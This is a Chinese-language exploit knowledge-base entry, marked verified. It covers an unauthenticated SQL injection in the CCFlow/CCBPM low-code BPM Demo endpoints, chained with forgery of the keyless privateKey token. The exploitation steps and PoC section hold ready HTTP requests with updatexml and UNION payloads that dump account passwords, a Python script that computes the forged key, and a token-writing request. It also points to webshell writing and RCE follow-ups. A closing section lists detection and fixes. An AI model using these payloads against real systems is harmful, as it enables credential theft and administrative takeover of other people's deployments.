---
id: web-generic-sqli-ccflow-demo-port-emp-unauth
title: CCFlow/CCBPM Demo Port_Emp 未授权 SQL 注入：报错/UNION 取管理员口令并伪造 privateKey 令牌
type: scenario
domain: web
path: web/generic/sqli
technique: dotnet-unauth-demo-endpoint-sqli
tags:
- sql-injection
- dotnet
- ccfpm
- low-code
- updatexml
- union
- token-forgery
- unauth
- mysql
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T08:59:20+08:00'
  notes: 已对照原文及61张图核对：图21 Port_Emp 直接拼接 empNo；图18 updatexml 报错回显 ~admin123,fuhui123,guobaogeng123；图26 IIS 下 UNION SELECT 111,1,1,No,Pass 回显 No/Pass；图10 CheckPrivateKey 公式为 userNo+MD5(userNo+yyyy_MM_dd+password)，无服务端密钥；图13/28 Port_WriteToken 用算出的 privateKey 写入 token 成功。原文无产品版本号，未设 affected_versions。PoC 未在本机执行。
url: /docs/web/generic/sqli/web-generic-sqli-ccflow-demo-port-emp-unauth/
draft: false
kb_aliases:
- CCFlow Port_Emp SQL 注入
- 低代码 BPM Port_Depts 注入
- Port_DeptsJson SQLi
- Port_WriteToken privateKey 伪造
- CCBPM Demo 接口未授权注入
---

## 一句话结论

CCFlow/CCBPM（原文称“某低代码 BPM”，代码为 CCFlow.NetCore）安装 Demo 模块后，`/WF/Demo/Port_Emp?empNo=`、`Port_Depts`、`Port_DeptsJson` 等接口无需登录，把参数直接拼进 SQL；用 `updatexml` 报错或 `UNION SELECT` 可读出 `Port_Emp` 中的管理员明文/弱口令，再用“userNo + MD5(userNo + 日期 + password)”这一无密钥公式伪造 `privateKey`，调用 `Port_WriteToken` 写入 token，即可带着该 token 访问受保护接口。

## 原理

- **未授权注入点**：`DemoController.Port_Emp(string token, string empNo)` 执行 `"SELECT No,Name,FK_Dept,Tel,Email FROM Port_Emp WHERE No='" + empNo + "'"`；`Port_Depts(string token, string rootNo)`、`Port_DeptsJson` 同样拼接 `rootNo`。这些方法没有调用 `Port_GenerToken`/`Port_LoginByToken`，因此无需 token；返回结果只含用户资料，但注入可越权读取整库。
- **报错回显**：开发环境（Kestrel/VS）异常页会把完整 SQL 与数据库异常回显。MySQL 用 `updatexml(1,concat(0x7e,(select group_concat(No,Pass) from Port_Emp),0x7e),1)` 触发 XPATH 报错，异常信息里带出 `~admin123,fuhui123,guobaogeng123` 等账号口令。
- **IIS 无报错时改 UNION**：IIS 默认不回显详细异常，可用 `empNo=admin' UNION SELECT 111,1,1,No,Pass from Port_Emp-- `；`Port_Emp` 查询 5 列（No,Name,FK_Dept,Tel,Email），让第 4/5 列承载 `No,Pass`，结果随 `data` JSON 返回。
- **privateKey 无服务端密钥**：`Port_WriteToken(privateKey, userNo, erpToken)` 先 `CheckPrivateKey`：按 `No=userNo` 查 `Pass`，计算 `val = userNo + MD5(userNo + DateTime.Now.ToString("yyyy_MM_dd") + password)`，与传入 `privateKey` 比较；没有 HMAC 密钥、盐或随机数。知道用户名、密码和当天日期即可本地算出 `privateKey`，调用接口把 `erpToken` 写入 `Port_Token`，该 token 随后被 `Port_LoginByToken` 接受（有效期约 300 秒并刷新）。
- 所以“注入拿口令”与“自算 privateKey 换 token”可以组成完整的前台未授权到后台 API 访问链；原文即用注入得到的 `admin/123` 生成 privateKey 并成功写入 token。

## 触发条件

- 目标为 CCFlow.NetCore / CCBPM 低代码 BPM，且安装时勾选了 Demo 模块（`/WF/Demo/*` 路由存在；官方说明 demo 为可选安装）；
- 数据库为 MySQL（报错注入）或 SQL Server（UNION/报错语法需调整）；
- `/WF/Demo/Port_Emp`、`/WF/Demo/Port_Depts` 等对攻击者可达；
- 目标存在弱口令/明文口令账号（原文为 `123`、`123456`）。

## 利用步骤

1. 访问 `/WF/Demo/Port_Emp?empNo=admin` 确认接口存在并返回用户 JSON。
2. 发送报错注入 payload 读取 `Port_Emp` 的 `No,Pass`（IIS 无回显时改用 UNION）。
3. 用泄露的账号口令按公式生成 `privateKey`。
4. 请求 `GET /WF/API/Port_WriteToken?privateKey=<val>&userNo=admin&erpToken=<任意token>`，返回“token写入成功”。
5. 后续请求带 `token=<erpToken>` 访问 `/WF/API/*` 等受保护接口，完成管理员操作。

## PoC

报错注入（原文 Kestrel 环境）：

```http
POST /WF/Demo/Port_Emp?empNo=admin'+and+updatexml(1,concat(0x7e,(select+group_concat(No,Pass)+from+Port_Emp),0x7e),1)--+ HTTP/1.1
Host: <target>
Content-Type: application/json

```

IIS 环境 UNION：

```http
POST /WF/Demo/Port_Emp?empNo=admin'+UNION+SELECT+111,1,1,No,Pass+from+Port_Emp--+ HTTP/1.1
Host: <target>
Content-Type: application/json

```

privateKey 生成（Python，等价于原文 C# 逻辑）：

```python
import hashlib
from datetime import datetime

def private_key(user_no, password):
    date = datetime.now().strftime("%Y_%m_%d")
    md5 = hashlib.md5((user_no + date + password).encode()).hexdigest().upper()
    return user_no + md5

print(private_key("admin", "123"))  # 例：admin01F0AA37CDA082F39ABA90CE2C658F9B
```

```http
GET /WF/API/Port_WriteToken?privateKey=admin01F0AA37CDA082F39ABA90CE2C658F9B&userNo=admin&erpToken=11111111111111111111 HTTP/1.1
Host: <target>
```

## 变体与关联

- 同类未授权 Demo 接口：`Port_Depts`、`Port_DeptsJson` 的 `rootNo` 同样可注入；`Port_Emps`/`Port_Emp` 不注入时可泄露部门/用户资料。
- 数据库变体：SQL Server 用 `convert(int,(select ...))` 报错或 UNION；MySQL 高权限时可尝试 `INTO OUTFILE` 写 Webshell。
- 关联：[[web-generic-sqli-error-based-extraction]]；本场景的增量是“Demo 未授权 + privateKey 无密钥可伪造”。
- 后续利用：拿到 token 后可访问大量 `/WF/API/*` 接口；结合 [[web-generic-file-upload-ccflow-iis-webconfig-aspx]] 的 BigAPI 上传可进一步 RCE。

## 检测与防御

- 检测：`/WF/Demo/Port_Emp` 等 Demo 路由的异常请求；参数含 `'`、`updatexml`、`UNION SELECT`、`group_concat`；错误页/响应中出现完整 SQL；`Port_WriteToken` 在短时间内被不同 IP 调用；token 写入后立即访问管理接口。
- 修复：生产环境不安装/删除 Demo 路由；所有查询使用参数化；`Port_WriteToken` 改为服务端密钥 HMAC/一次性随机数并绑定 TLS，禁止用“MD5(userNo+日期+password)”这类可离线重算的公式。
- 加固：强制管理员强口令并定期轮换；关闭详细错误页；WAF 拦截 SQL 关键字；限制 `/WF/Demo/*` 与 `/WF/API/Port_WriteToken` 的来源。
